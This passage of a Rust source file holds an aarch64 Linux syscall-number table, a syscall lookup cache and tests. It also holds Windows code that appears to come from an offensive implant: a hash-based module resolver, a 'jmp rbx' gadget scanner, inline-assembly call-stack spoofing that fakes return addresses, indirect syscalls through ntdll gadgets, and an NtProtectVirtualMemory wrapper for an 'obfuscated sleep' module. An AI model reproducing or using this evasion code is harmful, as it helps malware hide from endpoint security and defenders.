        "sched_setaffinity" => Ok(122),
        "sched_getaffinity" => Ok(123),
        "sched_yield" => Ok(124),
        "sched_get_priority_max" => Ok(125),
        "sched_get_priority_min" => Ok(126),
        "sched_rr_get_interval" => Ok(127),
        "restart_syscall" => Ok(128),
        "kill" => Ok(129),
        "tkill" => Ok(130),
        "tgkill" => Ok(131),
        "sigaltstack" => Ok(132),
        "rt_sigsuspend" => Ok(133),
        "rt_sigaction" => Ok(134),
        "rt_sigprocmask" => Ok(135),
        "rt_sigpending" => Ok(136),
        "rt_sigtimedwait" => Ok(137),
        "rt_sigqueueinfo" => Ok(138),
        "rt_sigreturn" => Ok(139),
        "setpriority" => Ok(140),
        "getpriority" => Ok(141),
        "reboot" => Ok(142),
        "setregid" => Ok(143),
        "setgid" => Ok(144),
        "setreuid" => Ok(145),
        "setuid" => Ok(146),
        "setresuid" => Ok(147),
        "getresuid" => Ok(148),
        "setresgid" => Ok(149),
        "getresgid" => Ok(150),
        "setfsuid" => Ok(151),
        "setfsgid" => Ok(152),
        "times" => Ok(153),
        "setpgid" => Ok(154),
        "getpgid" => Ok(155),
        "getsid" => Ok(156),
        "setsid" => Ok(157),
        "getgroups" => Ok(158),
        "setgroups" => Ok(159),
        "uname" => Ok(160),
        "sethostname" => Ok(161),
        "setdomainname" => Ok(162),
        "getrlimit" => Ok(163),
        "setrlimit" => Ok(164),
        "getrusage" => Ok(165),
        "umask" => Ok(166),
        "prctl" => Ok(167),
        "getcpu" => Ok(168),
        "gettimeofday" => Ok(169),
        "settimeofday" => Ok(170),
        "adjtimex" => Ok(171),
        "getpid" => Ok(172),
        "getppid" => Ok(173),
        "getuid" => Ok(174),
        "geteuid" => Ok(175),
        "getgid" => Ok(176),
        "getegid" => Ok(177),
        "gettid" => Ok(178),
        "sysinfo" => Ok(179),
        "mq_open" => Ok(180),
        "mq_unlink" => Ok(181),
        "mq_timedsend" => Ok(182),
        "mq_timedreceive" => Ok(183),
        "mq_notify" => Ok(184),
        "mq_getsetattr" => Ok(185),
        "msgget" => Ok(186),
        "msgctl" => Ok(187),
        "msgrcv" => Ok(188),
        "msgsnd" => Ok(189),
        "semget" => Ok(190),
        "semctl" => Ok(191),
        "semtimedop" => Ok(192),
        "semop" => Ok(193),
        "shmget" => Ok(194),
        "shmctl" => Ok(195),
        "shmat" => Ok(196),
        "shmdt" => Ok(197),
        "socket" => Ok(198),
        "socketpair" => Ok(199),
        "bind" => Ok(200),
        "listen" => Ok(201),
        "accept" => Ok(202),
        "connect" => Ok(203),
        "getsockname" => Ok(204),
        "getpeername" => Ok(205),
        "sendto" => Ok(206),
        "recvfrom" => Ok(207),
        "setsockopt" => Ok(208),
        "getsockopt" => Ok(209),
        "shutdown" => Ok(210),
        "sendmsg" => Ok(211),
        "recvmsg" => Ok(212),
        "readahead" => Ok(213),
        "brk" => Ok(214),
        "munmap" => Ok(215),
        "mremap" => Ok(216),
        "add_key" => Ok(217),
        "request_key" => Ok(218),
        "keyctl" => Ok(219),
        "clone" => Ok(220),
        "execve" => Ok(221),
        "mmap" => Ok(222),
        "fadvise64" => Ok(223),
        "swapon" => Ok(224),
        "swapoff" => Ok(225),
        "mprotect" => Ok(226),
        "msync" => Ok(227),
        "mlock" => Ok(228),
        "munlock" => Ok(229),
        "mlockall" => Ok(230),
        "munlockall" => Ok(231),
        "mincore" => Ok(232),
        "madvise" => Ok(233),
        "remap_file_pages" => Ok(234),
        "mbind" => Ok(235),
        "get_mempolicy" => Ok(236),
        "set_mempolicy" => Ok(237),
        "migrate_pages" => Ok(238),
        "move_pages" => Ok(239),
        "rt_tgsigqueueinfo" => Ok(240),
        "perf_event_open" => Ok(241),
        "accept4" => Ok(242),
        "recvmmsg" => Ok(243),
        "arch_specific_syscall" => Ok(244),
        "wait4" => Ok(260),
        "prlimit64" => Ok(261),
        "fanotify_init" => Ok(262),
        "fanotify_mark" => Ok(263),
        "name_to_handle_at" => Ok(264),
        "open_by_handle_at" => Ok(265),
        "clock_adjtime" => Ok(266),
        "syncfs" => Ok(267),
        "setns" => Ok(268),
        "sendmmsg" => Ok(269),
        "process_vm_readv" => Ok(270),
        "process_vm_writev" => Ok(271),
        "kcmp" => Ok(272),
        "finit_module" => Ok(273),
        "sched_setattr" => Ok(274),
        "sched_getattr" => Ok(275),
        "renameat2" => Ok(276),
        "seccomp" => Ok(277),
        "getrandom" => Ok(278),
        "memfd_create" => Ok(279),
        "bpf" => Ok(280),
        "execveat" => Ok(281),
        "userfaultfd" => Ok(282),
        "membarrier" => Ok(283),
        "mlock2" => Ok(284),
        "copy_file_range" => Ok(285),
        "preadv2" => Ok(286),
        "pwritev2" => Ok(287),
        "pkey_mprotect" => Ok(288),
        "pkey_alloc" => Ok(289),
        "pkey_free" => Ok(290),
        "statx" => Ok(291),
        "io_pgetevents" => Ok(292),
        "rseq" => Ok(293),
        // Syscalls added in kernel 5.10+
        "pidfd_send_signal" => Ok(424),
        "io_uring_setup" => Ok(425),
        "io_uring_enter" => Ok(426),
        "io_uring_register" => Ok(427),
        "open_tree" => Ok(428),
        "move_mount" => Ok(429),
        "fsopen" => Ok(430),
        "fsconfig" => Ok(431),
        "fsmount" => Ok(432),
        "fspick" => Ok(433),
        "pidfd_open" => Ok(434),
        "clone3" => Ok(435),
        "close_range" => Ok(436),
        "openat2" => Ok(437),
        "pidfd_getfd" => Ok(438),
        "faccessat2" => Ok(439),
        "process_madvise" => Ok(440),
        "epoll_pwait2" => Ok(441),
        "mount_setattr" => Ok(442),
        "quotactl_fd" => Ok(443),
        "landlock_create_ruleset" => Ok(444),
        "landlock_add_rule" => Ok(445),
        "landlock_restrict_self" => Ok(446),
        "memfd_secret" => Ok(447),
        "process_mrelease" => Ok(448),
        "futex_waitv" => Ok(449),
        "set_mempolicy_home_node" => Ok(450),
        "cachestat" => Ok(451),
        "fchmodat2" => Ok(452),
        "map_shadow_stack" => Ok(453),
        "futex_wake" => Ok(454),
        "futex_wait" => Ok(455),
        "futex_requeue" => Ok(456),
        "statmount" => Ok(457),
        "listmount" => Ok(458),
        "lsm_get_self_attr" => Ok(459),
        "lsm_set_self_attr" => Ok(460),
        "lsm_list_modules" => Ok(461),
        _ => anyhow::bail!("unknown aarch64 syscall: {}", name),
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    compile_error!("Unsupported architecture for direct syscalls");
}

/// Look up a Linux syscall by name and return a [`SyscallTarget`].
///
/// Results are memoised in [`LINUX_SYSCALL_CACHE`] so repeated lookups for the
/// same name avoid re-running the match.
#[cfg(all(unix, feature = "direct-syscalls"))]
pub fn get_syscall_id(name: &str) -> anyhow::Result<SyscallTarget> {
    let cache = LINUX_SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    {
        let guard = cache.lock().unwrap();
        if let Some(&ssn) = guard.get(name) {
            return Ok(SyscallTarget { ssn });
        }
    }
    let ssn = syscall_number_raw(name)?;
    cache.lock().unwrap().insert(name.to_owned(), ssn);
    Ok(SyscallTarget { ssn })
}

#[cfg(all(unix, feature = "direct-syscalls"))]
#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Debug, Clone)]
pub struct dirent64 {
    pub d_ino: u64,
    pub d_off: i64,
    pub d_reclen: u16,
    pub d_type: u8,
    pub d_name: [u8; 256],
}

#[cfg(all(unix, feature = "direct-syscalls"))]
#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Debug, Clone)]
pub struct stat64 {
    pub st_dev: u64,
    pub st_ino: u64,
    pub st_nlink: u64,
    pub st_mode: u32,
    pub st_uid: u32,
    pub st_gid: u32,
    pub __pad0: u32,
    pub st_rdev: u64,
    pub st_size: i64,
    pub st_blksize: i64,
    pub st_blocks: i64,
    pub st_atime: i64,
    pub st_atime_nsec: u64,
    pub st_mtime: i64,
    pub st_mtime_nsec: u64,
    pub st_ctime: i64,
    pub st_ctime_nsec: u64,
    pub __unused: [i64; 3],
}

#[cfg(windows)]
thread_local! {
    #[allow(dead_code)]
    static REAL_RET_ADDR: std::cell::Cell<usize> = std::cell::Cell::new(0);
}

#[cfg(windows)]
#[no_mangle]
#[allow(dead_code)]
pub unsafe extern "C" fn set_spoof_ret(real_ret: usize) {
    REAL_RET_ADDR.with(|r| r.set(real_ret));
}

#[cfg(windows)]
#[no_mangle]
#[allow(dead_code)]
pub unsafe extern "C" fn get_spoof_ret() -> usize {
    REAL_RET_ADDR.with(|r| r.get())
}

#[cfg(windows)]
/// Cross-reference:
/// - Primary call site: clean_call macro around line 979.
/// - Gadget is passed into spoof_call from clean_call around line 988.
pub fn find_jmp_rbx_gadget() -> usize {
    let base = unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL).unwrap_or(0)
            as *mut std::os::raw::c_void
    } as usize;
    if base == 0 {
        return 0;
    }
    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    let nt_headers = (base + unsafe { *dos_header }.e_lfanew as usize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    let size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage } as usize;
    let code = unsafe { std::slice::from_raw_parts(base as *const u8, size) };
    for i in 0..size.saturating_sub(1) {
        if code[i] == 0xff && code[i + 1] == 0xe3 {
            let candidate = base + i;
            // M-30: Verify the 2-byte gadget doesn't straddle a page boundary
            // and the memory is committed + executable.
            if unsafe { gadget_is_valid(candidate, 2) } {
                return candidate;
            }
            // If validation fails, continue searching for another match.
        }
    }
    0
}

#[cfg(windows)]
#[doc(hidden)]
#[inline(never)]
/// Cross-reference:
/// - Primary call site: clean_call macro around line 988.
/// - Receives gadget addresses from find_jmp_rbx_gadget.
pub unsafe fn spoof_call(
    api_addr: usize,
    gadget_addr: usize,
    arg1: u64,
    arg2: u64,
    arg3: u64,
    arg4: u64,
    stack_args: &[u64],
) -> u64 {
    // Stack-spoofing indirect call via a `jmp rbx` gadget in a system DLL.
    //
    // Flow:
    //   1. Set RBX = address of label 42 (the continuation after the gadget fires).
    //   2. Align the stack, copy extra arguments beyond the first four.
    //   3. Load the first four arguments into rcx/rdx/r8/r9.
    //   4. Push `gadget_addr` (a `jmp rbx` instruction) onto the stack as the
    //      fake return address.
    //   5. `jmp r11` (the API target) — the API sees the gadget as its caller.
    //   6. On `ret`, the API jumps to `gadget_addr` which does `jmp rbx`.
    //   7. `jmp rbx` → label 42 → clean up and return.
    //
    // Label discipline: 41 = skip-stack-copy branch; 42 = post-call continuation.
    // No label appears more than once in this block.
    let status: u64;
    let nstack = stack_args.len();
    let stack_ptr = stack_args.as_ptr();

    std::arch::asm!(
        "push rbx",
        "push r14",
        "push r15",

        // RBX = continuation: after gadget fires (jmp rbx), control comes here.
        "lea rbx, [rip + 42f]",

        // Compute and reserve aligned stack space for shadow store + extra args.
        "mov r14, rsp",
        "mov rax, {nstack}",
        "shl rax, 3",
        "add rax, 0x28 + 15",
        "and rax, -16",
        "sub rsp, rax",

        // Copy extra (>4) arguments into the shadow-space area.
        "test {nstack}, {nstack}",
        "jz 41f",
        "mov rcx, {nstack}",
        "mov rsi, {stack_ptr}",
        "lea rdi, [rsp + 0x28]",
        "cld",
        "rep movsq",

        "41:",
        // Load the first four register arguments per the Windows x64 ABI.
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",

        // Push the gadget address as the fake return address, then jump to the API.
        "mov r11, {api}",
        "mov r15, {gadget}",
        "push r15",
        "jmp r11",

        // ── Continuation: gadget (jmp rbx) lands here ──────────────────────
        "42:",
        "mov rsp, r14",
        "pop r15",
        "pop r14",
        "pop rbx",
        // rax holds the API return value; captured by the lateout constraint.

        api        = in(reg) api_addr,
        gadget     = in(reg) gadget_addr,
        nstack     = in(reg) nstack,
        stack_ptr  = in(reg) stack_ptr,
        a1         = in(reg) arg1,
        a2         = in(reg) arg2,
        a3         = in(reg) arg3,
        a4         = in(reg) arg4,
        lateout("rax") status,
        out("rcx") _, out("rdx") _,
        out("r8")  _, out("r9")  _, out("r10") _, out("r11") _,
        out("r14") _, out("r15") _,
        out("rsi") _, out("rdi") _,
    );
    status
}

#[cfg(windows)]
pub fn do_syscall_with_strategy(
    func_name: &str,
    args: &[u64],
    strategy: common::config::ExecStrategy,
) -> i32 {
    let target = match get_syscall_id(func_name) {
        Ok(t) => t,
        Err(e) => {
            tracing::error!(
                "do_syscall_with_strategy: cannot resolve syscall '{}': {}",
                func_name,
                e
            );
            return -1;
        }
    };
    match strategy {
        common::config::ExecStrategy::Direct => unsafe {
            // The previous direct inline-assembly path only handled the first
            // four Windows x64 arguments and used fragile register constraints.
            // Route through the shared wrapper instead so stack arguments are
            // handled consistently and unsupported ABIs fail in one place.
            do_syscall(target.ssn, target.gadget_addr, args)
        },
        _ => unsafe {
            // Indirect syscall: locate a `syscall; ret` gadget in clean ntdll and
            // trampoline through it so that the call appears to originate there.
            do_syscall(target.ssn, target.gadget_addr, args)
        },
    }
}

/// Wrapper around NtProtectVirtualMemory used by the obfuscated sleep crypto module.
/// Signature: NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect)
#[cfg(windows)]
pub unsafe fn syscall_NtProtectVirtualMemory(
    process_handle: u64,
    base_address: u64,
    region_size: u64,
    new_protect: u64,
    old_protect: u64,
) -> i32 {
    match get_syscall_id("NtProtectVirtualMemory") {
        Ok(target) => do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                process_handle,
                base_address,
                region_size,
                new_protect,
                old_protect,
            ],
        ),
        Err(e) => {
            log::warn!("syscall_NtProtectVirtualMemory: could not get SSN: {}", e);
            -1
        }
    }
}

#[cfg(all(test, target_os = "linux", feature = "direct-syscalls"))]
mod linux_direct_syscall_tests {
    use super::*;

    #[test]
    fn linux_get_syscall_id_resolves_getpid() {
        let target = get_syscall_id("getpid").expect("getpid syscall id should resolve");
        assert!(target.ssn > 0, "resolved syscall number should be non-zero");
    }

    #[test]
    fn linux_do_syscall_getpid_matches_libc() {
        let target = get_syscall_id("getpid").expect("getpid syscall id should resolve");
        let direct = unsafe { do_syscall(target.ssn, &[]) }
            .expect("direct syscall getpid should succeed") as libc::pid_t;
        let libc_pid = unsafe { libc::getpid() };
        assert_eq!(direct, libc_pid, "direct syscall pid must match libc getpid");
    }

    #[test]
    fn linux_syscall_macro_getpid_matches_libc() {
        let direct = syscall!("getpid").expect("syscall! getpid should succeed") as libc::pid_t;
        let libc_pid = unsafe { libc::getpid() };
        assert_eq!(direct, libc_pid, "syscall! pid must match libc getpid");
    }
}
